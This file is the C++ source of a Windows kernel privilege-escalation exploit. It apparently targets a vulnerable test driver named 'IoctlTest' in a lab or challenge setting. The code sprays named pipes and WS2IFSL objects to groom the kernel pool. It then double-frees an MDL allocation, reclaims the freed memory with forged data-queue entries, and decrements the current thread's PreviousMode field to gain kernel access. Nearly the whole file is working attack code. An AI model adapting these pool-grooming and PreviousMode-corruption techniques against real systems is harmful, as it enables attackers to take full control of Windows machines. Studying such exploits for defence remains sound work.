#define _CRT_SECURE_NO_WARNINGS 0
#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <Psapi.h>
#pragma warning(disable:4996) 
#include <sphelper.h>
#pragma warning(default: 4996)
#pragma comment (lib, "ntdll")
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

//#define DeBug
void DEBUG() {
#ifdef DeBug
	puts("[debug]");
	system("pause");
#endif
}

#define err_exit(msg) \
    do { \
       printf("[x] %s in %s: %d\n", msg, FILENAME(__FILE__), __LINE__); \
	   exit(-1); \
    } while (0)

/*
void err_exit(const char* msg) {
	printf("[x] %s in %s: %d\n", msg, __FILE__, __LINE__);
	exit(-1);
}
*/

#define FILENAME(file) (strrchr(file, '\\') ? strrchr(file, '\\') + 1 : file)

#define info(fmt, ...) \
    do { \
            printf(fmt"  [%s: %d]\n", ##__VA_ARGS__, FILENAME(__FILE__), __LINE__); \
    } while (0)

void binary_dump(const char *desc, void *addr, int len) {
	uint64_t *buf64 = (uint64_t *)addr;
	uint8_t *buf8 = (uint8_t *)addr;
	if (desc != NULL) {
		printf("[*] %s:\n", desc);
	}
	for (int i = 0; i < len / 8; i += 4) {
		printf("  %04x", i * 8);
		for (int j = 0; j < 4; j++) {
			i + j < len / 8 ? printf(" 0x%016llx", buf64[i + j]) : printf("                   ");
		}
		printf("   ");
		for (int j = 0; j < 32 && j + i * 8 < len; j++) {
			printf("%c", isprint(buf8[i * 8 + j]) ? buf8[i * 8 + j] : '.');
		}
		puts("");
	}
}

DWORD _GetVersion() {
	DWORD dwVersion = 0;
	DWORD dwMajorVersion = 0;
	DWORD dwMinorVersion = 0;
	DWORD dwBuild = 0;

	dwVersion = GetVersion();

	// Get the Windows version.
	dwMajorVersion = (DWORD)(LOBYTE(LOWORD(dwVersion)));
	dwMinorVersion = (DWORD)(HIBYTE(LOWORD(dwVersion)));

	// Get the build number.
	if (dwVersion < 0x80000000) {
		dwBuild = (DWORD)(HIWORD(dwVersion));
	}
	info("[+] Version is %d.%d (%d)", dwMajorVersion, dwMinorVersion, dwBuild);

	return dwVersion;
}

#define MAXIMUM_FILENAME_LENGTH 255 
typedef struct _SYSTEM_HANDLE
{
	PVOID Object;
	HANDLE UniqueProcessId;
	HANDLE HandleValue;
	ULONG GrantedAccess;
	USHORT CreatorBackTraceIndex;
	USHORT ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

typedef struct __SYSTEM_HANDLE_INFORMATION_EX
{
	ULONG_PTR HandleCount;
	ULONG_PTR Reserved;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

typedef enum __SYSTEM_INFORMATION_CLASS {
	SystemExtendedHandleInformation = 64
} SYSTEM_INFORMATION_CLASS_EX;

typedef NTSTATUS(WINAPI *PNtQuerySystemInformation)(
	__in SYSTEM_INFORMATION_CLASS_EX SystemInformationClass,
	__inout PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
	);

int getObject(uint64_t *pAddress, uint32_t Pid, uint64_t Handle)
{
	HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
	PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (query == NULL) {
		err_exit("GetProcAddress() failed");
	}
	ULONG len = 20;
	NTSTATUS status = (NTSTATUS)0xc0000004;
	PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;
	do {
		len *= 2;
		pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT, len);

		status = query(SystemExtendedHandleInformation, pHandleInfo, len, &len);

	} while (status == (NTSTATUS)0xc0000004);
	if (status != (NTSTATUS)0x0) {
		err_exit("NtQuerySystemInformation failed");
	}
	for (int i = 0; i < pHandleInfo->HandleCount; i++) {
		PVOID object = pHandleInfo->Handles[i].Object;
		HANDLE handle = pHandleInfo->Handles[i].HandleValue;
		HANDLE pid = pHandleInfo->Handles[i].UniqueProcessId;
		if (pid == (HANDLE)Pid && handle == (HANDLE)Handle) {
			*pAddress = (uint64_t)object;
			printf("[+] PID: %d\t", pid);
			printf("Object: %#llx\t", object);
			info("Handle: %#x\r", handle);
			break;
		}
	}
	return 0;
}

#define NP_HEADER_SIZE 0x30
#define TARGET_OBJECT_SIZE 0x120
#define DATA_ENTRY (TARGET_OBJECT_SIZE-0x10-NP_HEADER_SIZE)

typedef struct {
	HANDLE r;
	HANDLE w;
} PIPE_HANDLES;

typedef void (IO_APC_ROUTINE)(
	void* ApcContext,
	IO_STATUS_BLOCK* IoStatusBlock,
	unsigned long    reserved
	);

typedef int(__stdcall* NTFSCONTROLFILE)(
	HANDLE           fileHandle,
	HANDLE           event,
	IO_APC_ROUTINE* apcRoutine,
	void* ApcContext,
	IO_STATUS_BLOCK* ioStatusBlock,
	unsigned long    FsControlCode,
	void* InputBuffer,
	unsigned long    InputBufferLength,
	void* OutputBuffer,
	unsigned long    OutputBufferLength
	);

typedef struct {
	SHORT Type;
	USHORT Size;
	PVOID MdlAddress;
	ULONG Flags;
	PVOID AssociatedIrp;
	LIST_ENTRY ThreadListEntry;
	IO_STATUS_BLOCK IoStatus;
	CHAR RequestorMode;
	BOOLEAN PendingReturned;
	CHAR StackCount;
	CHAR CurrentLocation;
	BOOLEAN Cancel;
	UCHAR CancelIrql;
	CCHAR ApcEnvironment;
	UCHAR AllocationFlags;
	PVOID UserIosb;
	PVOID UserEvent;
	char Overlay[16];
	PVOID CancelRoutine;
	PVOID UserBuffer;
	CHAR TailIsWrong[0xe0];
} IRP;

typedef struct {
	LIST_ENTRY NextEntry;
	IRP* Irp;
	uint64_t  SecurityContext;
	uint32_t EntryType;
	uint32_t QuotaInEntry;
	uint32_t DataSize;
	uint32_t x;
} DATA_QUEUE_ENTRY;

struct Address {
	uint64_t sysProc;
	uint64_t curProc;
	uint64_t curThread;
};

HANDLE hDevice;
NTFSCONTROLFILE NtFsControlFile;
HANDLE ghThreadApc;
HANDLE hPipe = INVALID_HANDLE_VALUE;
HANDLE hPipe1 = INVALID_HANDLE_VALUE;
struct Address address;
PIPE_HANDLES PipeArray[0x1000];

#define SPRAY_PIPE 0x1000

DWORD WINAPI APCThread(LPVOID lparam) {
	while (1) {
		Sleep(0x1000);
	}
}

void init() {

	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
	setbuf(stderr, NULL);

	info("[+] Init the Attack Environment");
	hDevice = CreateFileA("\\\\.\\IoctlTest",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);

	if (hDevice == INVALID_HANDLE_VALUE) {
		err_exit("Failed to create driver file");
	}

	NtFsControlFile = (NTFSCONTROLFILE)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtFsControlFile");

	ghThreadApc = CreateThread(0, 0, APCThread, 0, 0, 0);
	if (ghThreadApc == INVALID_HANDLE_VALUE) {
		err_exit("Failed to CreateThread");
	}

	hPipe = CreateFile("\\\\.\\pipe\\addressPipe", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	hPipe1 = CreateFile("\\\\.\\pipe\\NamedPipe1", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);


	if (hPipe == INVALID_HANDLE_VALUE) {
		err_exit("Failed to connect leak-exp NamedPipe");
	}

	if (hPipe1 == INVALID_HANDLE_VALUE) {
		CloseHandle(hPipe);
		err_exit("Failed to connect pwn-exp NamedPipe");
	}

	DWORD bytesRead;
	if (!ReadFile(hPipe, &address, sizeof(address), &bytesRead, 0) || bytesRead <= 0) {
		err_exit("[X] Failed to ReadFile to get some kernel addresses");
	}

	printf("[+] sysProc: %#llx\t", address.sysProc);
	printf("curProc: %#llx\t", address.curProc);
	printf("curThread: %#llx\n", address.curThread);

	for (int i = 0; i < SPRAY_PIPE; i++) {
		PipeArray[i].w = CreateNamedPipe(
			"\\\\.\\pipe\\TestNamePipe",
			PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
			PIPE_TYPE_BYTE | PIPE_WAIT,
			PIPE_UNLIMITED_INSTANCES,
			DATA_ENTRY, DATA_ENTRY,
			0, 0);
		
		PipeArray[i].r = CreateFile("\\\\.\\pipe\\TestNamePipe", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);
	}

}


void sprayPipeWithoutHeader(char* data) {
	info("[+] Spray IO to occupy Ws2p");
	DWORD retLenth = 0;
	int status = 0;
	IO_STATUS_BLOCK isb;
	char irp_data[0x1000] = { 0 };
	memcpy(irp_data, data, TARGET_OBJECT_SIZE - 0x10);
	for (int i = 0; i < SPRAY_PIPE; i++) {
		status = NtFsControlFile(PipeArray[i].w, 0, 0, 0, &isb, 0x119FF8, irp_data, TARGET_OBJECT_SIZE - 0x10, 0, 0);
		if (status != 0x103) {
			err_exit("Failed to NtFsControlFile NamePipe");
		}
	}
}

#define SPRAY_PIPE_TMP 0x100
void SprayPipe(ULONG32 size) {
	info("[+] Spray NpFr to groom pool");
	ULONG32 payloadSize = size - 0x40;
	for (int i = 0; i < SPRAY_PIPE_TMP; i++) {
		HANDLE readPipe, writePipe;
		UCHAR* payload = (UCHAR*)malloc(payloadSize);
		if (payload == NULL) {
			err_exit("malloc failed");
		}
		memset(payload, 'A', payloadSize);
		BOOL res = CreatePipe(&readPipe, &writePipe, NULL, payloadSize);
		if (res == FALSE) {
			err_exit("CreatePipe failed");
		}

		DWORD resultLength;
		// res = WriteFile(writePipe, payload, sizeof(payload), &resultLength, NULL);
		res = WriteFile(writePipe, payload, payloadSize, &resultLength, NULL);
		if (res == FALSE) {
			err_exit("WriteFile failed");
		}
	}
}

// ws2ifsl
// wdm.h
typedef struct _FILE_FULL_EA_INFORMATION {
	ULONG NextEntryOffset;
	UCHAR Flags;
	UCHAR EaNameLength;
	USHORT EaValueLength;
	CHAR EaName[1];
} FILE_FULL_EA_INFORMATION, *PFILE_FULL_EA_INFORMATION;

typedef struct _PROC_DATA {
	HANDLE apcthread;				// 0x00
	void* RequestQueueRoutine;		// 0x04
	void* CancelQueueRoutine;		// 0x08
	void* ApcContext;				// 0x0C
	void* unknown3;					// 0x10
}PROC_DATA, *PPROC_DATA;

HANDLE CreateProcessHandle(HANDLE hThreadApc) {
	UNICODE_STRING deviceName;
	RtlInitUnicodeString(&deviceName, (PWSTR)L"\\Device\\WS2IFSL\\NifsPvd");

	OBJECT_ATTRIBUTES object;
	InitializeObjectAttributes(&object, &deviceName, 0, NULL, NULL);

	FILE_FULL_EA_INFORMATION* eaBuffer = (FILE_FULL_EA_INFORMATION*)malloc(sizeof(FILE_FULL_EA_INFORMATION) + sizeof("NifsPvd") + sizeof(PROC_DATA));

	if (eaBuffer == NULL) {
		err_exit("malloc failed, err: %d\n");
	}

	eaBuffer->NextEntryOffset = 0;
	eaBuffer->Flags = 0;
	eaBuffer->EaNameLength = sizeof("NifsPvd") - 1;
	eaBuffer->EaValueLength = sizeof(PROC_DATA);
	memcpy(eaBuffer->EaName, "NifsPvd", eaBuffer->EaNameLength + 1);

	PROC_DATA* eaData = (PROC_DATA*)((char*)eaBuffer + sizeof(FILE_FULL_EA_INFORMATION) + sizeof("NifsPvd") - 4);
	eaData->apcthread = hThreadApc;
	eaData->RequestQueueRoutine = (void*)0xaaaaaaaa;
	eaData->CancelQueueRoutine = (void*)0xbbbbbbbb;
	eaData->ApcContext = (void*)0xcccccccc;
	eaData->unknown3 = (void*)0xdddddddd;
	
	HANDLE handle = INVALID_HANDLE_VALUE;
	IO_STATUS_BLOCK IoStatusBlock;
	NTSTATUS status = NtCreateFile(
		&handle,
		MAXIMUM_ALLOWED,
		&object,
		&IoStatusBlock,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		0,
		FILE_OPEN_IF,
		0,
		eaBuffer,
		sizeof(FILE_FULL_EA_INFORMATION) + sizeof("NifsPvd") + sizeof(PROC_DATA)
	);
	// wprintf(L"hProcess = %p\n", handle);
	// getchar();
	if (NT_ERROR(status)) {
		free(eaBuffer);
		err_exit("(Process)NtCreateFile failed");
	}

	free(eaBuffer);
	return handle;
}

#define ALLOCATE32 0x9C402400
#define ALLOCATE64 0x9C402404
#define DELETE32   0x9C402408
#define DELETE64   0x9C40240C

uint32_t allocate32(size_t size) {
	char inBuffer[4] = { 0 };
	char outBuffer[8] = { 0 };
	DWORD retLength = 0;
	BOOL res;
	if (size > 0xd0) {
		*(uint32_t*)inBuffer = (size - 0x10 - 0x30) / 8 * 0x1000 - 0x1000;
	}
	else {
		*(uint32_t*)inBuffer = 0x1000;
	}
	res = DeviceIoControl(hDevice, ALLOCATE32, inBuffer, 4, outBuffer, 8, &retLength, NULL);
	if (!res || *(uint32_t*)(outBuffer + 4) == 0) {
		err_exit("Failed to allocate32 MDL");
	}
	return *(uint32_t*)(outBuffer + 4);
}

uint64_t allocate64(size_t size) {
	char inBuffer[4] = { 0 };
	char outBuffer[12] = { 0 };
	DWORD retLength = 0;
	BOOL res;
	if (size > 0xd0) {
		*(uint64_t*)inBuffer = (size - 0x10 - 0x30) / 8 * 0x1000 - 0x1000;
	}
	else {
		*(uint64_t*)inBuffer = 0x1000;
	}
	res = DeviceIoControl(hDevice, ALLOCATE64, inBuffer, 4, outBuffer, 12, &retLength, NULL);
	if (!res || *(uint64_t*)(outBuffer + 4) == 0) {
		err_exit("Failed to allocate64 MDL");
	}
	return *(uint64_t*)(outBuffer + 4);
}

void delete32() {
	char inBuffer[4] = { 0 };
	char outBuffer[8] = { 0 };
	DWORD retLength = 0;
	BOOL res;
	res = DeviceIoControl(hDevice, DELETE32, inBuffer, 4, outBuffer, 8, &retLength, NULL);
	if (!res) {
		err_exit("Failed to delete32 MDL");
	}
}

void delete64() {
	char inBuffer[4] = { 0 };
	char outBuffer[12] = { 0 };
	DWORD retLength = 0;
	BOOL res;
	res = DeviceIoControl(hDevice, DELETE64, inBuffer, 4, outBuffer, 12, &retLength, NULL);
	if (!res) {
		err_exit("Failed to delete64 MDL");
	}
}

void TryPwn() {
	DWORD bytesWritten = 0;
	char x = 'X';
	if (!WriteFile(hPipe1, &x, sizeof(x), &bytesWritten, 0)) {
		err_exit("Failed to WriteFile in pwn-exp NamedPipe");
	}

	x = 'X';
	bytesWritten = 0;

	Sleep(1000);
	if (!WriteFile(hPipe, &x, sizeof(x), &bytesWritten, 0)) {
		err_exit("Failed to WriteFile in leak-exp NamedPipe");
	}
}

int main()
{
	#define SPRAY_W2sP 1000
	DWORD retLength = 0;
	HANDLE hProcessList[SPRAY_W2sP];
	char buffer[0x1000] = { 0 };
	uint32_t* p32 = (uint32_t*)buffer;
	uint64_t* p64 = (uint64_t*)buffer;
	uint64_t userAddress = 0;

	_GetVersion();
	init();
	Sleep(2000);
	for (int i = 0; i < 100; i++) {
		allocate32(TARGET_OBJECT_SIZE);
	}
	SprayPipe(TARGET_OBJECT_SIZE);

	// allocate MDL
	userAddress = allocate64(TARGET_OBJECT_SIZE);
//	*(uint64_t*)(userAddress + 0) = 0xdeadbeefbeefdead;
//	*(uint64_t*)(userAddress + 8) = 0xbeefdeadbeefdead;
//	printf("[+] userAddesss: %p in exp\n", userAddress);
	// delete MDL
	info("[+] First Free MDL");
	delete64();

	// spray W2sP
	info("[+] Spray W2sP objects");
	for (int i = 0; i < SPRAY_W2sP; i++) {
		hProcessList[i] = CreateProcessHandle(ghThreadApc);
	}

	info("[+] Reclaim memory");
	for (int i = 0; i < 0x2000; i++) {
	//	printf(" [-] memory %d\n", i);
		userAddress = allocate32(TARGET_OBJECT_SIZE);
//		if (*(uint64_t*)(userAddress + 0) == 0xdeadbeefbeefdead &&
//			*(uint64_t*)(userAddress + 8) == 0xbeefdeadbeefdead) {
//			printf("[+] userAddesss: %p in exp\n", userAddress);
//			break;
//		}
	}

	// double free MDL
	info("[+] Double Free MDL");
	Sleep(500);
	delete64();

	memset(buffer, 'X', sizeof(buffer));
	p64[0] = 0x00000000636f7250;
	p64[0x38 / 8] = address.curThread + 0x232 + 0x30;
	sprayPipeWithoutHeader(buffer);

	info("[+] Try to dec PreviousMode");
	Sleep(500);
	for (int i = 0; i < SPRAY_W2sP; i++) {
		CloseHandle(hProcessList[i]);
	}
	
	TryPwn();
	info("[+] Exp Process END!");
	return 0;
}
